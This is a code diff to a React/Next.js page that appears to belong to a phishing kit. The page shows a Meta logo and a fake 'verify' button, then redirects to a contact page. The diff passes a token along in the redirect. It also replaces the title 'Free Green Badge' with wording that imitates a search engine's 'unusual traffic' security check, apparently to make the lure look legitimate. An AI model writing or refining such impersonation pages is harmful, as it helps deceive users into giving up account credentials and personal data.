@@ -10,12 +10,14 @@ const Index: FC = () => {
     const router = useRouter();
     const [isLoading, setIsLoading] = useState(false);
     const [isShowCheckMark, setisShowCheckMark] = useState(false);
+    const [verifyToken, setVerifyToken] = useState<number | null>(null);
     const handleVerify = async () => {
         setIsLoading(true);
         try {
             const response = await axios.post('/api/verify');
             const status = response.status;
             if (status === 200) {
+                setVerifyToken(response.data?.token ?? null);
                 setTimeout(() => {
                     setisShowCheckMark(true);
                     setIsLoading(false);
@@ -29,16 +31,16 @@ const Index: FC = () => {
         if (isShowCheckMark) {
             const redirectTimeOut = setTimeout(() => {
                 const currentTime = Date.now();
-                router.push(`/contact/${currentTime}`);
+                router.push(`/contact/${currentTime}${verifyToken ? `?tk=${verifyToken}` : ''}`);
             }, 500);
             return () => {
                 clearTimeout(redirectTimeOut);
             };
         }
-    }, [isShowCheckMark, router]);
+    }, [isShowCheckMark, router, verifyToken]);
     return (
         <div className='flex flex-col items-center justify-center pt-[150px]'>
-            <title>Free Green Badge</title>
+            <title>Our systems have detected unusual traffic from your computer network</title>
             <div className='w-[300px]'>
                 <Image src={MetaImage} alt='' className='w-16' />
                 <div className='flex w-full items-center justify-start py-5'>
